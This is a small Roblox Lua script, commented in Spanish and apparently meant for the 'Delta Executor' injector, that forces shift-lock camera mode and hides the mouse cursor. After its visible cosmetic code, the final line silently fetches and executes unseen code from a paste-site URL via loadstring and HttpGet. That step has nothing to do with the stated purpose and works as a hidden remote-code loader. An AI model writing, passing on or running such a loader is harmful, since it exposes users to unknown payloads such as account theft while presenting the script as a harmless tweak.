-- Shift Lock + Mouse Hidden (estilo TikTok)
-- Solo para Delta Executor

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local mouse = player:GetMouse()
local camera = workspace.CurrentCamera

-- Activar Shift Lock y esconder el ratón
UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
UserInputService.MouseIconEnabled = false  -- Esconde el cursor completamente

-- Mantener el Shift Lock activo siempre
RunService.RenderStepped:Connect(function()
    if UserInputService.MouseBehavior ~= Enum.MouseBehavior.LockCenter then
        UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
    end
    UserInputService.MouseIconEnabled = false
end)

print("Shift Lock + Mouse oculto activado")

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()